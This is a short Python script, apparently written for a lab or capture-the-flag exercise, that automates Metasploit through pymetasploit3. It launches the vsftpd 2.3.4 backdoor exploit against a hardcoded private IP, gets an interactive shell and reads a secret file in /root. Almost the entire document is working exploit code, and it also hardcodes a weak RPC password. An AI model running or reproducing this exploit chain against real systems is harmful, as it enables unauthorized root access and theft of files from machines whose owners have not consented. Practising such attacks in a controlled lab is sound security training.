#This script uses the pymetasploit3 library. Before running this script:
	#navigate to the metasploit console and type:
	# "load msgrpc Pass=abc123" (need capital P)


#running this script multiple times may cause errors. Restart metasploit and restart the msgrpc service (refer above) before running this script again
#if this program is taking a long time to run, quit it and run again.

from pymetasploit3.msfrpc import MsfRpcClient
import pprint

#start a new msfrpc client
client=MsfRpcClient('abc123',port=55552)
#check if we have any running sessions (exploited shells) already running on the target machine
if not client.sessions.list:	
	#if we don't have any sessions on the target, then we exploit the machine to get one. We are running the /exploit/fpt/vsftpd_234_backdoor exploit,
	exploit=client.modules.use('exploit','unix/ftp/vsftpd_234_backdoor')
	#we set the target ip
	exploit['RHOSTS'] = '10.50.1.78'
	#we run the exploit. This should return an object with  {'job_id':<string number>,'uuid': <string>}. If job_id is None then the exploit failed.
	sess=exploit.execute(payload='cmd/unix/interact')
	print(sess)
	#we wait for the exploit to finish before continuing. If the exploit failed, this will run indefinetly so exit tbe program.
	while not client.sessions.list:
		pass
	#if the job_id is None then the exploit failed
	if sess['job_id'] == None:
		print('exploit failed')
#print list of running sessions
pprint.pprint(client.sessions.list)
#create a shell. The functions takes in a valid session number. We do not use the job_id field from the sess variable because running the scrupt myltiple times will cause it get to fall out of sync with the real session number 
shell=client.sessions.session(list(client.sessions.list)[0])
#we navigate to the root directory and output the contents of the secret file.
shell.write('cd /root;cat secret.txt')
#we wait for the command to finish running and print the result
read = False
while not read:
	try:
		print(shell.read())
		read = True
	except:
		pass




